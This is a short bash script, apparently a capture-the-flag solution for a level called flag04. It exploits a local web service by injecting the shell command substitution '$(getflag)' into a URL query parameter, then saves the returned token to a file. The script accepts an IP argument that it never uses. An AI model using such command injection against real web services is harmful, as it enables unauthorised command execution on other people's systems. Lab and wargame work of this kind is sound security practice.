#!/usr/bin/env bash

if [ ! -z "$1" ];then

	flag=$(curl 'http://localhost:4747/?x=$(getflag)')
	flag=$(echo $flag | awk '{print $NF}')

	echo "Password:"
	echo $flag
	echo $flag > flag04.pwd
else
	echo "Usage: ./flag04.sh <ip address>"
fi
